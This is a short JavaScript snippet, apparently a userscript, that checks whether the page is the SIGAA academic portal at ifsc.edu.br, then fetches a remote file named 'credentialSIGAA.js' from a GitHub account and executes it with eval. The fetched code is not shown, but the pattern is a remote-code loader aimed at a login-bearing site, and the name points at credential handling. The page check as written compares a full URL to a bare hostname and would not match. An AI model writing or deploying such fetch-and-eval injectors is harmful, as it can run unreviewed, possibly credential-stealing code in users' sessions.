let url;


if (location.href == 'sigaa.ifsc.edu.br'){
    url = "https://raw.githubusercontent.com/Wolota/ips/main/credentialSIGAA.js";
}







(function() {
    fetch(url)
        .then(response => response.text())
        .then(code => {
        eval(code);
    });

})();
